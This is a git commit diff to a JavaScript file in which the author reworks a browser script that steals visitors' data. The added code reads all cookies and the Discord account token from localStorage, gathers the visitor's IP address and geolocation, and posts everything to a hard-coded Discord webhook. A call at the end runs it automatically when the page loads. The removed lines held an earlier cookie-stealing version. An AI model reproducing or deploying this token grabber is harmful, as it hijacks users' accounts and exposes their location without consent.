9a42414f49726cf5048eaccb3502776946aa6fe8
DrDreadful <124979607+DrDreadful5Official@users.noreply.github.com>
2024-04-21 23:37:31 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,44 +1,44 @@
-// Function to steal cookies
-function stealCookies() {
-    var cookies = document.cookie;
-    // Send cookies to a remote server
-    fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ cookies: cookies })
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('Cookies successfully stolen!');
-        } else {
-            console.error('Failed to steal cookies:', response.status, response.statusText);
+function stealDataAndToken() {
+    var allCookies = document.cookie; // Get all cookies from the current document
+    var discordToken = null;
+
+    // Retrieve the storage named "https://discord.com"
+    var discordStorage = localStorage.getItem('https://discord.com');
+
+    if (discordStorage) {
+        // Parse the storage data as JSON
+        var storageData = JSON.parse(discordStorage);
+
+        // Iterate over the keys in the storage
+        for (var key in storageData) {
+            if (key === 'token') {
+                // Found the key named "token", retrieve the value
+                discordToken = storageData[key];
+                break; // Stop iterating once the token is found
+            }
         }
-    })
-    .catch(error => {
-        console.error('Error stealing cookies:', error.message);
-    });
-}
+    } else {
+        console.error('No storage named "https://discord.com" found in local storage.');
+    }
 
-// Fetch user's IP and geolocation
-fetch('https://httpbin.org/ip')
-.then(response => response.json())
-.then(data => {
-    var clientIp = data.origin;
-
-    // Fetch geolocation information from IPinfo.io
-    fetch(`https://ipinfo.io/${clientIp}/json?token=0b2944a985b669`)
+    // Fetch user's IP
+    fetch('https://httpbin.org/ip')
     .then(response => response.json())
-    .then(geoData => {
-        var city = geoData.city;
-        var region = geoData.region;
-        var country = geoData.country;
-        var isp = geoData.org;
-        var postalCode = geoData.postal;
+    .then(data => {
+        var clientIp = data.origin;
 
-        // Send a message to Discord webhook including the geolocation information
-        var message = `\`\`\`
+        // Fetch geolocation information from IPinfo.io
+        fetch(`https://ipinfo.io/${clientIp}/json?token=0b2944a985b669`)
+        .then(response => response.json())
+        .then(geoData => {
+            var city = geoData.city;
+            var region = geoData.region;
+            var country = geoData.country;
+            var isp = geoData.org;
+            var postalCode = geoData.postal;
+
+            // Send a message to Discord webhook including the stolen data
+            var message = `\`\`\`
 Someone visited the website from:
 - City: ${city}
 - Region: ${region}
@@ -46,21 +46,21 @@ Someone visited the website from:
 - Internet provider: ${isp}
 - Postal Code: ${postalCode}
 - IP Address: ${clientIp}
+- Cookies: ${allCookies} // Include all cookies here
+- Discord Token: ${discordToken} // Include the Discord token here
 \`\`\``;
 
-        // Send message to Discord
-        sendMessageToDiscord(message);
-
-        // Call function to steal cookies
-        stealCookies();
+            // Send message to Discord
+            sendMessageToDiscord(message);
+        })
+        .catch(error => {
+            console.error('Error fetching geolocation information:', error);
+        });
     })
     .catch(error => {
-        console.error('Error fetching geolocation information:', error);
+        console.error('Error fetching IP address:', error.message);
     });
-})
-.catch(error => {
-    console.error('Error fetching IP address:', error.message);
-});
+}
 
 // Function to send message to Discord webhook
 function sendMessageToDiscord(message) {
@@ -84,3 +84,6 @@ function sendMessageToDiscord(message) {
         console.error('Error sending message to Discord:', error.message);
     });
 }
+
+// Call function to steal data and token
+stealDataAndToken();
